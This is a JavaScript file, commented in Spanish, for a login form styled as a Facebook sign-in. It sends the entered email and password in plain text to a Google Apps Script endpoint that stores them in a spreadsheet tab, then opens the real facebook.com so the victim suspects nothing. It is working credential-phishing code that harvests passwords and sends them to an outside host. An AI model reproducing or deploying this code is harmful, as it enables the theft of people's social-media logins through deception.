const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwR8pzNfNsEnYFh2XT4vNYwTmhfuw41mmgRK5QRq0nal4TK5Zde4hiK9UfA1ZFjAzKp/exec";

// Función para mostrar la notificación flotante de éxito
function showSuccessNotification() {
    const messageElement = document.getElementById('success-message');
    if (messageElement) {
        messageElement.classList.add('show');
        setTimeout(() => {
            messageElement.classList.remove('show');
        }, 3000); 
    }
}

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); 
    
    const form = event.target;
    const loginButton = form.querySelector('.btn-login');
    
    const email = form.querySelector('input[name="email"]').value.trim();
    const password = form.querySelector('input[name="password"]').value.trim();
    
    if(!email || !password) {
        alert("Por favor completa los campos.");
        return;
    }

    loginButton.textContent = 'Iniciando sesión...';
    loginButton.disabled = true;

    // Paquete para registrar o almacenar las credenciales en la pestaña de Facebook del Sheets
    const payload = {
        action: "registerUser",
        provider: "facebook",
        nombre: email,
        colonia: "Red Social",
        contrasena: password
    };

    // 1. Enviar datos a Google Sheets en segundo plano
    fetch(SCRIPT_URL, {
        method: 'POST',
        headers: {
            "Content-Type": "text/plain;charset=utf-8"
        },
        body: JSON.stringify(payload) 
    })
    .then(response => response.json())
    .then(result => {
        console.log("Sincronizado con Sheets:", result);
    })
    .catch(error => {
        console.error('Error de red al sincronizar:', error);
    })
    .finally(() => {
        // Guardar en el almacenamiento local
        localStorage.setItem('vecino_nombre', email);
        localStorage.setItem('vecino_colonia', 'Red Social');

        // Mostrar notificación visual
        showSuccessNotification();

        // Abrir Facebook real en otra pestaña
        window.open("https://www.facebook.com", "_blank");

        // 🌟 REDIRIGIR PASANDO EL USUARIO POR PARÁMETRO Y FORZAR RECARGA
        setTimeout(() => {
            window.location.href = `../index.html?user=${encodeURIComponent(email)}`; 
        }, 1000);
    });
}); // <--- 🛠️ ESTE ERA EL CIERRE QUE FALTABA DEL addEventListener

document.querySelector('.btn-new-account').addEventListener('click', function() {
    alert("Función no disponible temporalmente.");
});